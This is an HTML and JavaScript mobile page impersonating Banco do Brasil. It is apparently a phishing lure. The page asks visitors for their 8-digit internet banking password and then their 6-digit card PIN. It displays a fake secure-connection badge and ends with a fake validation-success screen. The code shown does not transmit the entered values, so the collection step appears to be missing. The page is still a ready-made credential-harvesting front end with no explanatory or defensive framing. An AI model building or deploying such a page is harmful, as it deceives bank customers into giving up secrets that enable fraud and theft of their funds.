<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Banco do Brasil | Validação</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            min-height: 100vh;
            touch-action: manipulation;
            -webkit-tap-highlight-color: transparent;
        }

        .phone-screen {
            width: 100%;
            max-width: 450px;
            height: 100vh;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            position: relative;
            overflow: hidden;
        }

        .bb-blue-dark { background-color: #003399; }
        .bb-yellow { background-color: #f8d117; }
        .text-bb-blue { color: #003399; }

        .header-bb {
            background-color: #ffffff;
            border-bottom: 2px solid #f8d117;
            flex-shrink: 0;
        }

        .pin-field {
            flex: 1;
            height: 54px;
            max-width: 42px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 6px;
            border: 1px solid #e2e8f0;
            border-bottom: 3px solid #cbd5e1;
            background-color: #f8fafc;
            font-size: 1.6rem;
            font-weight: 700;
            color: #003399;
            transition: all 0.15s ease-in-out;
        }

        .pin-field.active {
            border-color: #003399;
            border-bottom-color: #003399;
            background-color: #fff;
            box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1);
        }

        /* Otimização para Input no Android */
        #real-input {
            position: absolute;
            top: 0;
            left: -100%;
            opacity: 0;
            width: 200%;
            height: 100%;
            z-index: 10;
        }

        .btn-bb {
            background-color: #003399;
            color: white;
            font-weight: 700;
            height: 54px;
            border-radius: 999px;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            font-size: 1.1rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .btn-bb:active {
            transform: scale(0.98);
            opacity: 0.9;
        }

        .btn-bb:disabled {
            background-color: #e2e8f0;
            color: #94a3b8;
            opacity: 1;
        }

        .logo-bb-container {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .bb-icon {
            width: 32px;
            height: 32px;
            background: #f8d117;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 6px;
        }

        .fade-in {
            animation: fadeIn 0.3s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(8px); }
            to { opacity: 1; transform: translateY(0); }
        }

        #pin-container {
            display: flex;
            gap: 6px;
            width: 100%;
            justify-content: center;
            margin-bottom: 2rem;
        }
    </style>
</head>
<body onload="initApp()">

    <div class="phone-screen" onclick="focusInput()">
        <!-- Header -->
        <div class="header-bb p-4 flex items-center justify-between shadow-sm">
            <div class="flex items-center">
                <button class="mr-4 text-bb-blue"><i data-lucide="chevron-left" class="w-7 h-7"></i></button>
                <div class="logo-bb-container">
                    <div class="bb-icon">
                        <span class="text-bb-blue font-black text-sm">BB</span>
                    </div>
                    <span class="text-bb-blue font-bold tracking-tight text-xl">Banco do Brasil</span>
                </div>
            </div>
            <i data-lucide="info" class="w-6 h-6 text-zinc-400"></i>
        </div>

        <div class="bb-yellow h-1 w-full"></div>

        <div id="content-area" class="p-6 fade-in flex-grow">
            <div class="mb-8">
                <h2 id="title-label" class="text-2xl font-bold text-bb-blue mb-4">Senha de 8 dígitos</h2>
                <div id="desc-box" class="bg-zinc-50 p-4 rounded-xl border border-zinc-100">
                    <p id="desc-label" class="text-zinc-600 text-sm leading-relaxed">
                        Para garantir a segurança do seu acesso, informe sua <span class="font-bold text-bb-blue">Senha de Internet (8 dígitos)</span>.
                    </p>
                </div>
            </div>

            <!-- Area de Digitação -->
            <div class="relative py-4">
                <div id="pin-container">
                    <!-- Gerado via JS -->
                </div>

                <input 
                    type="number" 
                    id="real-input" 
                    inputmode="numeric" 
                    pattern="[0-9]*"
                    autocomplete="one-time-code"
                >
            </div>

            <div class="flex items-center gap-3 p-4 bg-emerald-50 rounded-xl border border-emerald-100 mt-4">
                <div class="bg-emerald-500 p-1 rounded-full">
                    <i data-lucide="check" class="w-3 h-3 text-white"></i>
                </div>
                <p class="text-[12px] text-emerald-700 font-semibold uppercase tracking-wider">Conexão segura criptografada</p>
            </div>
        </div>

        <!-- Footer Fixo -->
        <div class="p-6 bg-white border-t border-zinc-100">
            <button id="btn-continue" disabled class="btn-bb shadow-lg">
                Confirmar
            </button>
            <button id="forgot-password" class="w-full text-center text-zinc-400 text-sm font-medium mt-6 hover:text-bb-blue">
                Esqueci minha senha
            </button>
        </div>
    </div>

    <script>
        // Inicializa ícones Lucide
        lucide.createIcons();

        const realInput = document.getElementById('real-input');
        const pinContainer = document.getElementById('pin-container');
        const btnContinue = document.getElementById('btn-continue');
        const titleLabel = document.getElementById('title-label');
        const descLabel = document.getElementById('desc-label');
        const contentArea = document.getElementById('content-area');

        let currentStep = 8;

        function initApp() {
            renderFields(8);
            setTimeout(focusInput, 500);
        }

        function focusInput() {
            realInput.focus();
            // Garante que o cursor vá para o fim se já houver texto
            const val = realInput.value;
            realInput.value = '';
            realInput.value = val;
        }

        function renderFields(count) {
            pinContainer.innerHTML = '';
            for (let i = 0; i < count; i++) {
                const field = document.createElement('div');
                field.className = 'pin-field';
                field.id = `field-${i}`;
                pinContainer.appendChild(field);
            }
        }

        function updateUI() {
            // Limita a entrada apenas a números
            let cleanValue = realInput.value.replace(/\D/g, '');
            if (cleanValue.length > currentStep) {
                cleanValue = cleanValue.slice(0, currentStep);
            }
            realInput.value = cleanValue;

            const fields = document.querySelectorAll('.pin-field');
            fields.forEach((field, index) => {
                if (index < cleanValue.length) {
                    field.innerText = cleanValue[index]; // NUMÉRICO E VISÍVEL
                    field.classList.add('active');
                } else {
                    field.innerText = '';
                    field.classList.remove('active');
                }
            });

            btnContinue.disabled = (cleanValue.length !== currentStep);
        }

        realInput.addEventListener('input', updateUI);

        // Bloqueia teclas não numéricas comuns no teclado Android/Desktop
        realInput.addEventListener('keydown', (e) => {
            if (["e", "E", "+", "-", ".", ","].includes(e.key)) {
                e.preventDefault();
            }
        });

        btnContinue.addEventListener('click', () => {
            if (currentStep === 8) {
                // Efeito de transição
                contentArea.style.opacity = '0.3';
                btnContinue.disabled = true;
                btnContinue.innerHTML = '<i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i>';
                lucide.createIcons();

                setTimeout(() => {
                    currentStep = 6;
                    realInput.value = '';
                    
                    titleLabel.innerText = "Senha de 6 dígitos";
                    descLabel.innerHTML = 'Quase lá! Agora informe a <span class="font-bold text-bb-blue">Senha do seu Cartão (6 dígitos)</span> para concluir.';
                    
                    renderFields(6);
                    updateUI();
                    
                    contentArea.style.opacity = '1';
                    btnContinue.innerHTML = 'Confirmar';
                    focusInput();
                }, 800);
            } else {
                // Finalização
                btnContinue.disabled = true;
                btnContinue.innerHTML = '<i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i> Processando...';
                lucide.createIcons();
                
                setTimeout(() => {
                    btnContinue.style.backgroundColor = '#10b981';
                    btnContinue.innerText = "VALIDADO COM SUCESSO";
                }, 2000);
            }
        });

        // Garante que o input não perca o foco
        document.addEventListener('touchend', (e) => {
            if (e.target.tagName !== 'BUTTON') {
                setTimeout(focusInput, 50);
            }
        });
    </script>
</body>
</html>
